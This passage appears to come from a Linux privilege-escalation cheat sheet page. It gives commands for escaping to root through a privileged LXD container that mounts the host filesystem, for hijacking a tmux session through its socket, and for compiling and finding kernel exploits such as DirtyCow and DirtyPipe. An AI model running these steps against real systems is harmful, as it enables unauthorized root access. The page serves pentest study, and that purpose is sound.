<a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">saghul</span><span class="p">/</span><span class="n">lxd-alpine-builder</span>
<a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a><span class="p">./</span><span class="n">build-alpine</span> <span class="n">-a</span> <span class="n">i686</span>
<a id="__codelineno-49-4" name="__codelineno-49-4" href="#__codelineno-49-4"></a>
<a id="__codelineno-49-5" name="__codelineno-49-5" href="#__codelineno-49-5"></a><span class="c"># import the image</span>
<a id="__codelineno-49-6" name="__codelineno-49-6" href="#__codelineno-49-6"></a><span class="n">lxc</span> <span class="n">image</span> <span class="n">import</span> <span class="p">./</span><span class="n">alpine</span><span class="p">.</span><span class="n">tar</span><span class="p">.</span><span class="n">gz</span> <span class="p">-</span><span class="n">-alias</span> <span class="n">myimage</span>
<a id="__codelineno-49-7" name="__codelineno-49-7" href="#__codelineno-49-7"></a>
<a id="__codelineno-49-8" name="__codelineno-49-8" href="#__codelineno-49-8"></a><span class="c"># run the image</span>
<a id="__codelineno-49-9" name="__codelineno-49-9" href="#__codelineno-49-9"></a><span class="n">lxc</span> <span class="n">init</span> <span class="n">myimage</span> <span class="n">mycontainer</span> <span class="n">-c</span> <span class="n">security</span><span class="p">.</span><span class="n">privileged</span><span class="p">=</span><span class="n">true</span>
<a id="__codelineno-49-10" name="__codelineno-49-10" href="#__codelineno-49-10"></a>
<a id="__codelineno-49-11" name="__codelineno-49-11" href="#__codelineno-49-11"></a><span class="c"># mount the /root into the image</span>
<a id="__codelineno-49-12" name="__codelineno-49-12" href="#__codelineno-49-12"></a><span class="n">lxc</span> <span class="n">config</span> <span class="n">device</span> <span class="n">add</span> <span class="n">mycontainer</span> <span class="n">mydevice</span> <span class="n">disk</span> <span class="n">source</span><span class="p">=/</span> <span class="n">path</span><span class="p">=/</span><span class="n">mnt</span><span class="p">/</span><span class="n">root</span> <span class="n">recursive</span><span class="p">=</span><span class="n">true</span>
<a id="__codelineno-49-13" name="__codelineno-49-13" href="#__codelineno-49-13"></a>
<a id="__codelineno-49-14" name="__codelineno-49-14" href="#__codelineno-49-14"></a><span class="c"># interact with the container</span>
<a id="__codelineno-49-15" name="__codelineno-49-15" href="#__codelineno-49-15"></a><span class="n">lxc</span> <span class="nb">start </span><span class="n">mycontainer</span>
<a id="__codelineno-49-16" name="__codelineno-49-16" href="#__codelineno-49-16"></a><span class="n">lxc</span> <span class="n">exec</span> <span class="n">mycontainer</span> <span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">sh</span>
</code></pre></div>
<p>Alternatively https://github.com/initstring/lxd_root</p>
<h2 id="hijack-tmux-session">Hijack TMUX session</h2>
<p>Require a read access to the tmux socket : <code>/tmp/tmux-1000/default</code>.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="n">export</span> <span class="n">TMUX</span><span class="p">=/</span><span class="n">tmp</span><span class="p">/</span><span class="n">tmux</span><span class="p">-</span><span class="n">1000</span><span class="p">/</span><span class="k">default</span><span class="p">,</span><span class="n">1234</span><span class="p">,</span><span class="n">0</span> 
<a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a><span class="n">tmux</span> <span class="nb">ls</span>
</code></pre></div>
<h2 id="kernel-exploits">Kernel Exploits</h2>
<p>Precompiled exploits can be found inside these repositories, run them at your own risk !
* <a href="https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits">bin-sploits - @offensive-security</a>
* <a href="https://github.com/lucyoa/kernel-exploits/">kernel-exploits - @lucyoa</a></p>
<p>The following exploits are known to work well, search for more exploits with <code>searchsploit -w linux kernel centos</code>.</p>
<p>Another way to find a kernel exploit is to get the specific kernel version and linux distro of the machine by doing <code>uname -a</code>
Copy the kernel version and distribution, and search for it in google or in https://www.exploit-db.com/.</p>
<h3 id="cve-2022-0847-dirtypipe">CVE-2022-0847 (DirtyPipe)</h3>
<p>Linux Privilege Escalation - Linux Kernel 5.8 &lt; 5.16.11</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>https://www.exploit-db.com/exploits/50808
</code></pre></div>
<h3 id="cve-2016-5195-dirtycow">CVE-2016-5195 (DirtyCow)</h3>
<p>Linux Privilege Escalation - Linux Kernel &lt;= 3.19.0-73.8</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="c"># make dirtycow stable</span>
<a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a><span class="nb">echo </span><span class="n">0</span> <span class="p">&gt;</span> <span class="p">/</span><span class="n">proc</span><span class="p">/</span><span class="n">sys</span><span class="p">/</span><span class="n">vm</span><span class="p">/</span><span class="n">dirty_writeback_centisecs</span>
<a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a><span class="n">g</span><span class="p">++</span> <span class="n">-Wall</span> <span class="n">-pedantic</span> <span class="n">-O2</span> <span class="n">-std</span><span class="p">=</span><span class="n">c</span><span class="p">++</span><span class="n">11</span> <span class="n">-pthread</span> <span class="n">-o</span> <span class="n">dcow</span> <span class="n">40847</span><span class="p">.</span><span class="nb">cpp </span><span class="n">-lutil</span>
<a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a><span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">dirtycow</span><span class="p">/</span><span class="n">dirtycow</span><span class="p">.</span><span class="n">github</span><span class="p">.</span><span class="n">io</span><span class="p">/</span><span class="n">wiki</span><span class="p">/</span><span class="n">PoCs</span>
<a id="__codelineno-52-5" name="__codelineno-52-5" href="#__codelineno-52-5"></a><span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">evait-security</span><span class="p">/</span><span class="n">ClickNRoot</span><span class="p">/</span><span class="n">blob</span><span class="p">/</span><span class="n">master</span><span class="p">/</span><span class="n">1</span><span class="p">/</span><span class="n">exploit</span><span class="p">.</span><span class="n">c</span>
</code></pre></div>
<h3 id="cve-2010-3904-rds">CVE-2010-3904 (RDS)</h3>
<p>Linux RDS Exploit - Linux Kernel &lt;= 2.6.36-rc8</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a><span class="n">https</span><span class="p">://</span><span class="n">www</span><span class="p">.</span><span class="n">exploit-db</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">exploits</span><span class="p">/</span><span class="n">15285</span><span class="p">/</span>
</code></pre></div>
<h3 id="cve-2010-4258-full-nelson">CVE-2010-4258 (Full Nelson)</h3>
<p>Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04)</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a><span class="n">https</span><span class="p">://</span><span class="n">www</span><span class="p">.</span><span class="n">exploit-db</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">exploits</span><span class="p">/</span><span class="n">15704</span><span class="p">/</span>
</code></pre></div>
<h3 id="cve-2012-0056-mempodipper">CVE-2012-0056 (Mempodipper)</h3>
<p>Linux Kernel 2.6.39 &lt; 3.2.2 (Gentoo / Ubuntu x86/x64)</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a><span class="n">https</span><span class="p">://</span><span class="n">www</span><span class="p">.</span><span class="n">exploit-db</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">exploits</span><span class="p">/</span><span class="n">18411</span>
</code></pre></div>
<h2 id="references">References</h2>
<ul>
<li><a href="https://mn3m.info/posts/suid-vs-capabilities/">SUID vs Capabilities - Dec 7, 2017 - Nick Void aka mn3m</a></li>
<li><a href="https://fosterelli.co/privilege-escalation-via-docker.html">Privilege escalation via Docker - April 22, 2015 - Chris Foster</a></li>
<li><a href="https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/">An Interesting Privilege Escalation vector (getcap/setcap) - NXNJZ - AUGUST 21, 2018</a></li>
<li><a href="https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/">Exploiting wildcards on Linux - Berislav Kucan</a></li>
<li><a href="http://p4pentest.in/2016/10/19/code-execution-with-tar-command/">Code Execution With Tar Command - p4pentest</a></li>
<li><a href="http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt">Back To The Future: Unix Wildcards Gone Wild - Leon Juranic</a></li>
<li><a href="https://www.securitynewspaper.com/2018/04/25/use-weak-nfs-permissions-escalate-linux-privileges/">HOW TO EXPLOIT WEAK NFS PERMISSIONS THROUGH PRIVILEGE ESCALATION? - APRIL 25, 2018</a></li>
<li><a href="https://reboare.github.io/lxd/lxd-escape.html">Privilege Escalation via lxd - @reboare</a></li>
<li><a href="https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/">Editing /etc/passwd File for Privilege Escalation - Raj Chandel - MAY 12, 2018</a></li>
<li><a href="https://github.com/nongiach/sudo_inject">Privilege Escalation by injecting process possessing sudo tokens - @nongiach @chaignc</a></li>
<li><a href="http://www.deer-run.com/~hal/sysadmin/pam_cracklib.html">Linux Password Security with pam_cracklib - Hal Pomeranz, Deer Run Associates</a></li>
<li><a href="https://github.com/sagishahar/lpeworkshop/blob/master/Local%20Privilege%20Escalation%20Workshop%20-%20Slides.pdf">Local Privilege Escalation Workshop - Slides.pdf - @sagishahar</a></li>
<li><a href="https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Vulnerabilities/SSH/key-exploit.md">SSH Key Predictable PRNG (Authorized_Keys) Process - @weaknetlabs</a></li>
<li><a href="https://dirtypipe.cm4all.com/">The Dirty Pipe Vulnerability</a></li>
</ul>

  <hr>
<div class="md-source-file">
  <small>
    
      Last update:
      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">October 23, 2022</span>
      
    
  </small>
</div>





                
              </article>
            </div>
          
          
        </div>
        
          <a href="#" class="md-top md-icon" data-md-component="top" hidden>
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
            Back to top
          </a>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tracking", "toc.integrate", "navigation.top"], "search": "../../assets/javascripts/workers/search.208ed371.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../assets/javascripts/bundle.b78d2936.min.js"></script>
      
    
  </body>
</html>